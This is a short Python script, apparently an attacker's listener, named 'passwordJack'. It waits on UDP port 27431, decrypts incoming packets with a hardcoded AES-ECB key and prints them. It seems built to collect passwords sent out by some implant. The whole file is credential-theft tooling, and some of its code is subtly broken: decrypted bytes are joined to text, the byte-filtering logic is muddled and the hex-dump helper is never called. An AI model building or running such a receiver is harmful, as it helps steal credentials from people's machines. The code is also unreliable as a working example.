#!/usr/bin/python
"""Intercept and decrypt the secret key."""
import select
from socket import AF_INET, SOCK_DGRAM, socket

from Cryptodome.Cipher import AES

KEY = "fdsl;mewrjope456fds4fbvfnjwaugfo".encode('utf-8')

def stdout (t, m):
        if (t == "+"):
                print ("\x1b[32;1m[+]\x1b[0m\t" + m + "\n")
        elif (t == "-"):
                print ("\x1b[31;1m[-]\x1b[0m\t" + m + "\n")
        elif (t == "*"):
                print ("\x1b[34;1m[*]\x1b[0m\t" + m + "\n")
        elif (t == "!"):
                print ("\x1b[33;1m[!]\x1b[0m\t" + m + "\n")

def sanitizeByte (byte):
        if byte == "0x0":
                return "0"
        if ord(byte) < 30 or ord(byte) > 128:
                return "."
        if ord(byte) > 30 or ord(byte) < 128:
                return byte
        return None

def createDump (data):
        dump, by, hx, _temp = "", [], [], ""
        unprint = list(data)
        for el in unprint:
                hx.append(el.encode("utf-8").hex())
                by.append(sanitizeByte(el))
        i = 0
        while i < len(hx):
                if (len(hx) - i ) >= 16:
                        dump += " ".join(hx[i:i+16])
                        dump += "         "
                        dump += " ".join(by[i:i+16])
                        dump += "\n"
                        i = i + 16
                else:
                        dump += " ".join(hx[i:(len(hx) - 1)])
                        pad = len(" ".join(hx[i:(len(hx) - 1)]))
                        dump += " " * (56 - pad)
                        dump += " ".join(by[i:(len(hx) - 1)])
                        dump += "\n"
                        i = i + len(hx)
        return dump

def passwordJack():
        key = AES.new(KEY, AES.MODE_ECB )
        s = socket(AF_INET, SOCK_DGRAM)
        s.bind(("", 27431))
        s.setblocking(0)
        while True:
            ret = select.select([s],[],[])
            m = ret[0][0].recv(1024)
            stdout("+","\n" + key.decrypt(m))

passwordJack()
